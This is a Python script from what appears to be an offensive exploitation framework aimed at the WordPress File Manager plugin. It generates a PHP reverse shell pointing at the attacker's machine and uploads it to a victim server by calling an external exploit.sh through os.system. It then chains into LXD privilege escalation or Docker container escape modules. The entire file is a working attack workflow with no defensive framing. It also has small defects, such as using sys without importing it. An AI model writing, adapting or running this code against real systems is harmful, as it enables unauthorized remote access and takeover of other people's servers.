import os
import my_reverse_shell
import requests
from datetime import datetime
from Privilege_Escalation_LXD import LXD_exploit
from DockerEscape import escape_docker

def wp_file_manager(victim_info, attacker_info, general_info, exp):
	
	f = open("reverse_shell.php", "w")

	code = my_reverse_shell.gen_reverse_shell(attacker_info)

	f.write(code)

	f.close()

	print('[+] Reverse Shell generated')

	flag = False

		

	print('[*] Executing exploit')
	
	print('[*] Sending the payload...')
	launch_exploit(attacker_info, victim_info)
	user_dir = os.getcwd()
	print('[*] Proceeding to execute the reverse shell')
	match int(exp):
		case 1:
			LXD_exploit.run(victim_info, attacker_info, general_info)
		case 2:
			pass
		case 3:
			escape_docker.run(victim_info, attacker_info, general_info)
		case default:
			sys.exit("Something went wrong, invalid exploit")

def launch_exploit(attacker_info, victim_info):
	now = datetime.now()
	s = ''
	if victim_info['secure'] == True:
		s = 's'
	print('[DEBBUG] Exec => bash exploit.sh -u http' + s + '://{ip}:{port} -f {path}'.format(ip = victim_info["ip"], port = victim_info["port"], path = ( os.getcwd() + '/reverse_shell.php')))
	os.system('''bash exploit.sh -u http''' + s + '''://{ip}:{port} -f {path}'''.format(ip = victim_info["ip"], port = victim_info["port"], path = ( os.getcwd() + '/reverse_shell.php')))



